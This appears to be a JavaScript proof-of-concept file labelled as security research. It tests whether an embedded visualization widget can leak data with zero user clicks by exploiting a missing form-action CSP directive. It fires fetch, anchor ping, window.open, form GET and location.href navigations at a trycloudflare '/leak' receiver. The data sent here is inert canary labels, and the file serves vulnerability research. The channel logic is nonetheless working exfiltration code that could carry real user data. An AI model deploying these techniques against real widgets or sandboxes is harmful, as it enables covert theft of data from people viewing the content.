/* T64 NAVIGATION EXFIL - Pluto Security research, inert canary.
   Rationale: the widget CSP has NO form-action directive (and
   form-action does NOT fall back to default-src), the sandbox
   tokens include allow-forms when external navigation is on, and
   the runner's form-routing / navigate-canceller hooks are only
   installed for OTHER widget classes (enableExternalNavigationGating
   / disableExternalNavigation are not passed for inline
   visualizations). T4 (Oct 18) judged forms "blocked" by watching
   for a NEW TAB - but a form with no target navigates the iframe
   itself, and there was no network ground truth then.
   Question: can the VIEWER-session widget send a canary to the
   researcher's own receiver with ZERO clicks via a navigation
   channel (anchor ping / window.open / form GET / location.href)?
   fetch is included as the known-blocked control (T43).
   Data sent = inert "T64-*" labels only. Nothing else stored. */
(function () {
  var R = "https://between-notified-postposted-classic.trycloudflare.com/leak?d=";
  function log(m) { try { console.log("[T64] " + m + " @" + Date.now()); } catch (e) {} }
  log("START nav-exfil (inert) origin=" + location.origin);

  var t = 0;
  function step(f) { setTimeout(f, t); t += 900; }

  /* S1 control: plain fetch - expect CSP-blocked (T43/T61) */
  step(function () {
    log("S1 fetch-control firing");
    fetch(R + "T64-S1-fetch-control-" + Date.now(), { cache: "no-store" })
      .then(function (r) { log("S1 fetch-OK?! status=" + r.status + " (connect-src changed - report this)"); })
      .catch(function (e) { log("S1 fetch-blocked " + (e && e.message)); });
  });

  /* S2 anchor ping: ping is governed by ping-src -> default-src 'self'.
     Expect blocked by CSP; receiver log decides. href "#" keeps the doc alive. */
  step(function () {
    try {
      var a = document.createElement("a");
      a.href = "#";
      a.ping = R + "T64-S2-ping-" + Date.now();
      document.body.appendChild(a);
      a.click();
      log("S2 ping-click fired (href #)");
    } catch (e) { log("S2 ERR " + e.message); }
  });

  /* S3 raw window.open popup - expect the Chrome popup blocker (no gesture).
     If it opens: zero-click data delivery (visible tab). */
  step(function () {
    try {
      var w = window.open(R + "T64-S3-windowopen-" + Date.now(), "_blank");
      log("S3 window.open -> " + (w ? "OPENED (zero-click tab)" : "null (blocked)"));
    } catch (e) { log("S3 ERR " + e.message); }
  });

  /* S4 form GET, _self navigation - the headline channel.
     May navigate this frame away (app dies after this) or pop a host
     dialog (openExternalForm). Logged BEFORE firing either way. */
  step(function () {
    log("S4 form-GET firing (frame may navigate away now)");
    try {
      var f = document.createElement("form");
      f.method = "GET";
      f.action = R + "T64-S4-form-get-" + Date.now();
      document.body.appendChild(f);
      f.submit();
      log("S4 submit() returned (no exception)");
    } catch (e) { log("S4 ERR " + e.message); }
  });

  /* S5 self-navigation via location.href - pure navigation, no form.
     Only reached if S4 did not navigate the frame. */
  step(function () {
    log("S5 self-nav firing (frame will navigate away if unblocked)");
    location.href = R + "T64-S5-selfnav-" + Date.now();
  });

  step(function () { log("DONE all steps attempted"); });
})();
